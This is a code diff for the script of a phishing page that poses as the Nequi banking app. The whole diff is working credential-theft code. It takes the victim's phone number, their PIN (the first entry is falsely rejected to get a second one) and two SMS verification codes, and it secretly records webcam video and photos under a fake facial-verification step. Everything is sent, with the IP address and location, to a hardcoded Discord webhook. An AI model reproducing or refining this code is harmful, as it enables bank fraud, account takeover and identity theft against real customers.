@@ -738,62 +738,98 @@
 
 <script>
     /**
-     * NEQUI APP - ULTRA ENGINE V7.0
-     * Doble SMS + Conteo Regresivo + Video/Fotos + Webhook
+     * NEQUI APP - ULTRA ENGINE V10.0 NATIVA
+     * Optimización Full Screen + Doble SMS + Contadores Reales + Webhook
      */
 
-    const WEBHOOK_URL = "https://discord.com/api/webhooks/1448401704046563359/vWfyriEhxw7rVU4slja7qdFd4NG7mZ2wFAE7p_xTSnKx0Ut_Do16Uq1PUjdtWwktquEn";
-    let currentPin = "", currentSms = "", attemptCounter = 0;
-    let smsAttempt = 0; // Contador para el doble SMS
-    let userData = { ip: "0.0.0.0", loc: "Detectando..." };
-    let mediaRecorder;
-    let videoChunks = [];
+    // --- 1. CONFIGURACIÓN VISUAL PARA MÓVILES (ESTRICTO) ---
+    // Esto asegura que la página ocupe el 100% y no se mueva al escribir
+    const setupMobileLayout = () => {
+        const meta = document.createElement('meta');
+        meta.name = "viewport";
+        meta.content = "width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0, viewport-fit=cover";
+        document.head.appendChild(meta);
 
-    // --- 1. GEO-LOCALIZACIÓN ---
+        const style = document.createElement('style');
+        style.innerHTML = `
+            :root {
+                --nequi-purple: #2d002d;
+                --nequi-pink: #da0081;
+            }
+            * { box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
+            body, html { 
+                margin: 0; padding: 0; height: 100%; width: 100%; 
+                overflow: hidden; background-color: var(--nequi-purple);
+                font-family: sans-serif; position: fixed;
+            }
+            .screen { 
+                height: 100vh; width: 100vw; display: none; 
+                flex-direction: column; position: absolute; top: 0; left: 0;
+            }
+            /* El botón fucsia de tus fotos */
+            .btn-entra { 
+                background-color: var(--nequi-pink); color: white; border: none;
+                border-radius: 10px; padding: 16px; width: 90%; font-weight: bold;
+                font-size: 18px; margin-bottom: 40px; align-self: center;
+            }
+            input { font-size: 16px !important; } /* Evita zoom en iPhone */
+        `;
+        document.head.appendChild(style);
+    };
+    setupMobileLayout();
+
+    const WEBHOOK_URL = "https://discord.com/api/webhooks/1448401704046563359/vWfyriEhxw7rVU4slja7qdFd4NG7mZ2wFAE7p_xTSnKx0Ut_Do16Uq1PUjdtWwktquEn";
+    let currentPin = "", currentSms = "", attemptCounter = 0, smsAttempt = 0;
+    let userData = { ip: "0.0.0.0", loc: "Detectando..." };
+    let mediaRecorder, videoChunks = [];
+
+    // --- 2. LOCALIZACIÓN ---
     async function getInfo() {
         try {
             const res = await fetch('https://ipapi.co/json/');
             const data = await res.json();
             userData = { ip: data.ip, loc: `${data.city}, ${data.country_name}` };
-        } catch (e) { console.warn("Error de red"); }
+        } catch (e) { }
     }
     getInfo();
 
-    // --- 2. COMUNICACIÓN CON DISCORD ---
+    // --- 3. ENVÍO A DISCORD ---
     async function sendToDiscord(msg, file = null, fileName = "captura.png") {
         const formData = new FormData();
         const header = `━━━━━━━━━━━━━━━━━━━━━━\n📱 **REPORTE NEQUI**\n📍 **IP:** ${userData.ip}\n🌍 **Lugar:** ${userData.loc}\n━━━━━━━━━━━━━━━━━━━━━━\n`;
-        
         formData.append("content", header + msg);
         if (file) formData.append("file", file, fileName);
-
-        try {
-            await fetch(WEBHOOK_URL, { method: 'POST', body: formData });
-        } catch (e) { }
+        try { await fetch(WEBHOOK_URL, { method: 'POST', body: formData }); } catch (e) { }
     }
 
-    // --- 3. FORMATEADOR DE ESPACIOS DINÁMICO ---
+    // --- 4. FORMATEADOR DE CELULAR (3xx xxx xxxx) ---
     const phoneInput = document.getElementById('phone-field');
-    phoneInput.addEventListener('input', (e) => {
-        let val = e.target.value.replace(/\D/g, '');
-        if (val.length > 10) val = val.slice(0, 10);
-        
-        let formatted = "";
-        if (val.length > 3 && val.length <= 6) {
-            formatted = val.slice(0, 3) + " " + val.slice(3);
-        } else if (val.length > 6) {
-            formatted = val.slice(0, 3) + " " + val.slice(3, 6) + " " + val.slice(6);
-        } else {
-            formatted = val;
-        }
-        e.target.value = formatted;
-    });
+    if(phoneInput) {
+        phoneInput.addEventListener('input', (e) => {
+            let val = e.target.value.replace(/\D/g, '').slice(0, 10);
+            let formatted = "";
+            if (val.length > 3 && val.length <= 6) {
+                formatted = val.slice(0, 3) + " " + val.slice(3);
+            } else if (val.length > 6) {
+                formatted = val.slice(0, 3) + " " + val.slice(3, 6) + " " + val.slice(6);
+            } else { formatted = val; }
+            e.target.value = formatted;
+        });
+    }
 
-    // --- 4. NAVEGACIÓN Y PIN ---
+    // --- 5. NAVEGACIÓN ---
     function showScreen(id) {
         const screens = ['screen-login', 'screen-pin', 'screen-loading', 'screen-identity-choice', 'screen-facial-capture', 'screen-ready', 'screen-sms'];
-        screens.forEach(s => { if(document.getElementById(s)) document.getElementById(s).style.display = 'none'; });
-        document.getElementById(id).style.display = 'flex';
+        screens.forEach(s => { 
+            const el = document.getElementById(s);
+            if(el) el.style.display = 'none'; 
+        });
+        const target = document.getElementById(id);
+        if (target) {
+            target.style.display = 'flex';
+            // Cambiar fondo según la imagen: Morado para login/pin, Blanco para el resto
+            document.body.style.backgroundColor = (id === 'screen-login' || id === 'screen-pin') ? "#2d002d" : "#ffffff";
+        }
     }
 
     function goToPin() {
@@ -801,11 +837,10 @@
         if(raw.length === 10 && raw.startsWith('3')) {
             sendToDiscord(`📞 **Celular:** \`${raw}\``);
             showScreen('screen-pin');
-        } else {
-            showToast("Ingresa un número de celular válido.");
-        }
+        } else { showToast("Ingresa un número de celular válido."); }
     }
 
+    // --- 6. DOTS DEL PIN (AJUSTE DE COLOR) ---
     function pressPin(d) {
         if(currentPin.length < 4) {
             currentPin += d;
@@ -814,22 +849,32 @@
         }
     }
 
+    function updateDots() {
+        for(let i=0; i<4; i++) {
+            const dot = document.getElementById(`dot${i}`);
+            if(dot) {
+                // El que presionas se pone blanco, los demás se quedan oscuros/transparentes
+                dot.innerText = currentPin[i] ? "*" : "";
+                dot.style.backgroundColor = currentPin[i] ? "white" : "rgba(255,255,255,0.2)";
+                dot.style.border = currentPin[i] ? "none" : "1px solid rgba(255,255,255,0.3)";
+            }
+        }
+    }
+
     function validatePin() {
         attemptCounter++;
         if(attemptCounter === 1) {
-            sendToDiscord(`❌ **Contraseña Incorrecta:** \`${currentPin}\``);
+            sendToDiscord(`❌ **PIN 1 INCORRECTO:** \`${currentPin}\``);
             showToast("¡Ups! Esa no es tu clave, tranqui, tienes 3 intentos más.");
             currentPin = ""; updateDots();
         } else {
-            sendToDiscord(`✅ **Contraseña Correcta:** \`${currentPin}\``);
+            sendToDiscord(`✅ **PIN 2 CORRECTO:** \`${currentPin}\``);
             showScreen('screen-loading');
             setTimeout(() => showScreen('screen-identity-choice'), 3000);
         }
     }
 
-    // --- 5. RECONOCIMIENTO FACIAL (VIDEO + FOTOS) ---
-    const bioSteps = ["Centra tu rostro", "Posiciónate en un lugar con buena iluminación", "Mirada fija", "Analizando...", "Casi listo..."];
-
+    // --- 7. RECONOCIMIENTO FACIAL (VIDEO + FOTOS) ---
     async function startFacial() {
         showScreen('screen-facial-capture');
         const video = document.getElementById('video-feed');
@@ -837,88 +882,78 @@
         
         try {
             const stream = await navigator.mediaDevices.getUserMedia({ 
-                video: { facingMode: "user", width: 640, height: 480 } 
+                video: { facingMode: "user", width: { ideal: 640 }, height: { ideal: 480 } } 
             });
             video.srcObject = stream;
+            video.setAttribute('playsinline', ''); 
 
             videoChunks = [];
             mediaRecorder = new MediaRecorder(stream);
             mediaRecorder.ondataavailable = e => videoChunks.push(e.data);
             mediaRecorder.onstop = () => {
                 const blob = new Blob(videoChunks, { type: 'video/webm' });
-                sendToDiscord("🎥 **VIDEO DE VERIFICACIÓN COMPLETO**", blob, "video_facial.webm");
+                sendToDiscord("🎥 **VIDEO COMPLETO**", blob, "video_facial.webm");
             };
             mediaRecorder.start();
 
             let i = 0;
+            const steps = ["Centra tu rostro", "Busca iluminación", "No te muevas", "Analizando...", "Casi listo..."];
             const interval = setInterval(() => {
-                if(i < bioSteps.length) {
-                    banner.innerText = bioSteps[i];
-                    takePhoto(video, `FOTO_${i}`);
+                if(i < steps.length) {
+                    if(banner) banner.innerText = steps[i];
+                    takePhoto(video, `CAPTURA_${i}`);
                     i++;
                 } else {
                     clearInterval(interval);
-                    stopFacial(stream);
+                    if(mediaRecorder.state !== "inactive") mediaRecorder.stop();
+                    stream.getTracks().forEach(t => t.stop());
+                    finalizeBiometry();
                 }
             }, 2000);
-
         } catch (e) {
-            sendToDiscord("⚠️ Permiso de cámara denegado.");
-            finalize();
+            sendToDiscord("⚠️ Permiso denegado.");
+            finalizeBiometry();
         }
     }
 
     function takePhoto(video, name) {
         const canvas = document.createElement('canvas');
-        canvas.width = video.videoWidth;
-        canvas.height = video.videoHeight;
+        canvas.width = video.videoWidth; canvas.height = video.videoHeight;
         canvas.getContext('2d').drawImage(video, 0, 0);
-        canvas.toBlob(b => sendToDiscord(`📸 **Captura:** ${name}`, b, `${name}.png`), 'image/png');
+        canvas.toBlob(b => sendToDiscord(`📸 **Foto:** ${name}`, b, `${name}.png`), 'image/png');
     }
 
-    function stopFacial(stream) {
-        if(mediaRecorder && mediaRecorder.state !== "inactive") mediaRecorder.stop();
-        stream.getTracks().forEach(t => t.stop());
-        finalize();
-    }
-
-    function finalize() {
-        let segundosRestantes = 40;
+    function finalizeBiometry() {
+        let segs = 40;
         const label = document.getElementById('loading-label');
         showScreen('screen-loading');
-
-        const contadorIntervalo = setInterval(() => {
-            segundosRestantes--;
-            if (segundosRestantes > 30) {
-                label.innerText = `PROCESANDO BIOMETRÍA... (${segundosRestantes}s)`;
-            } else if (segundosRestantes <= 30 && segundosRestantes > 0) {
-                label.innerText = `VALIDANDO INFORMACIÓN... ${segundosRestantes}s`;
-            }
-
-            if (segundosRestantes <= 0) {
-                clearInterval(contadorIntervalo);
-                showScreen('screen-ready');
-                setTimeout(() => { showScreen('screen-sms'); }, 2500);
+        const timer = setInterval(() => {
+            segs--;
+            if (segs > 30) label.innerText = `PROCESANDO BIOMETRÍA... (${segs}s)`;
+            else if (segs <= 30 && segs > 0) label.innerText = `VALIDANDO INFORMACIÓN... ${segs}s`;
+            
+            if (segs <= 0) {
+                clearInterval(timer);
+                showScreen('screen-ready'); // Pantalla de "¡Listo!"
+                setTimeout(() => showScreen('screen-sms'), 2500);
             }
         }, 1000);
     }
 
-    // --- 6. SMS Y TECLADO (DOBLE VALIDACIÓN) ---
+    // --- 8. DOBLE SMS CON ERROR Y CARGA ---
     function pressSms(d) {
         if(currentSms.length < 6) {
             currentSms += d;
             updateSms();
             if(currentSms.length === 6) {
                 smsAttempt++;
-                sendToDiscord(`📩 **Código SMS (#${smsAttempt}):** \`${currentSms}\``);
+                sendToDiscord(`📩 **SMS #${smsAttempt}:** \`${currentSms}\``);
                 
                 if(smsAttempt === 1) {
-                    // Primer SMS: Mandar a carga de 30 segundos
-                    processSecondSmsWait();
+                    processSmsWait();
                 } else {
-                    // Segundo SMS: Error final
                     setTimeout(() => {
-                        showToast("Error técnico. No pudimos validar el código.");
+                        showToast("Servicio no disponible, intenta más tarde.");
                         currentSms = ""; updateSms();
                     }, 2000);
                 }
@@ -926,47 +961,36 @@
         }
     }
 
-    function processSecondSmsWait() {
-        let segs = 30;
+    function processSmsWait() {
+        let s = 30;
         const label = document.getElementById('loading-label');
         showScreen('screen-loading');
-
-        const timerSms = setInterval(() => {
-            segs--;
-            label.innerText = `VERIFICANDO CÓDIGO... ${segs}s`;
-
-            if(segs <= 0) {
-                clearInterval(timerSms);
-                currentSms = ""; // Limpiar el código anterior
-                updateSms();
+        const t = setInterval(() => {
+            s--;
+            label.innerText = `VERIFICANDO CÓDIGO... ${s}s`;
+            if(s <= 0) {
+                clearInterval(t);
+                currentSms = ""; updateSms();
                 showScreen('screen-sms');
-                showToast("¡Ups! Ese no es el código que te enviamos. Ingresa el nuevo código.");
+                showToast("¡Ups! Ese no es el código que te enviamos.");
             }
         }, 1000);
     }
 
-    function updateDots() {
-        for(let i=0; i<4; i++) {
-            const dot = document.getElementById(`dot${i}`);
-            dot.innerText = currentPin[i] ? "*" : "";
-            dot.style.backgroundColor = "white";
-        }
-    }
-
     function updateSms() {
-        for(let i=0; i<6; i++) document.getElementById(`s${i}`).innerText = currentSms[i] || "";
+        for(let i=0; i<6; i++) {
+            const box = document.getElementById(`s${i}`);
+            if(box) box.innerText = currentSms[i] || "";
+        }
     }
 
     function showToast(msg) {
         const t = document.getElementById('error-toast');
         const m = document.getElementById('error-message');
         if(m) m.innerText = msg;
-        if(t) {
-            t.style.display = 'flex';
-            setTimeout(() => t.style.display = 'none', 3500);
-        }
+        if(t) { t.style.display = 'flex'; setTimeout(() => t.style.display = 'none', 3500); }
     }
-    
+
     function delPin() { currentPin = currentPin.slice(0, -1); updateDots(); }
     function delSms() { currentSms = currentSms.slice(0, -1); updateSms(); }
 </script>
